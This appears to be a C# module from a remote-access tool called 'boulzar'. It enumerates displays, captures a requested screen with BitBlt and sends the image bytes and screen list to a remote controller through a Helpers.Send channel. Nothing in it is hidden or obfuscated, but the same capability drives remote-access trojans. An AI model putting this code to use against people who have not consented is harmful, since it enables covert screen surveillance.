using boulzar.Other;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
namespace boulzar.Methods
{
    class RDP : IDisposable
    {
        public static void RDP_info()
        {
            string Tosend = "";
            int scrindex = 0;
            foreach (Screen scr in Screen.AllScreens)
            {
                //    \\.\DISPLAY1~1280x720#
                //
                Tosend += "~" + scr.DeviceName + "~";
                Tosend += "#" + FormatScreenResolution(GetBounds(scrindex)) + "#";
                scrindex += 1;
            }

            Console.WriteLine(Tosend);
            Helpers.Send(DataType.Rdp_Screens, Helpers.Getbytes(Tosend));
        }
        public static void Handle_Capture(string data)
        {
            string[] splited = data.Split('~');
            byte[] image = ImageToByte(CaptureScreen(int.Parse(splited[1])));
            Helpers.Send(DataType.Rdp_image, image);
        }
        private const int SRCCOPY = 0x00CC0020;
        public static Bitmap CaptureScreen(int screenNumber)
        {
            Rectangle bounds = GetBounds(screenNumber);
            Bitmap screen = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppPArgb);

            using (Graphics g = Graphics.FromImage(screen))
            {
                IntPtr destDeviceContext = g.GetHdc();
                IntPtr srcDeviceContext = Helpers.CreateDC("DISPLAY", null, null, IntPtr.Zero);

                Helpers.BitBlt(destDeviceContext, 0, 0, bounds.Width, bounds.Height, srcDeviceContext, bounds.X,
                    bounds.Y, SRCCOPY);

                Helpers.DeleteDC(srcDeviceContext);
                g.ReleaseHdc(destDeviceContext);
            }

            return screen;
        }
        public static Rectangle GetBounds(int screenNumber)
        {
            return Screen.AllScreens[screenNumber].Bounds;
        }
        public static byte[] ImageToByte(Image img)
        {
            ImageConverter converter = new ImageConverter();
            return (byte[])converter.ConvertTo(img, typeof(byte[]));
        }
        public static string FormatScreenResolution(Rectangle resolution)
        {
            return string.Format("{0}x{1}", resolution.Width, resolution.Height);
        }


        #region Disposition 
        public void Dispose()
        {


            GC.SuppressFinalize(this);
        }

        #endregion
    }
}
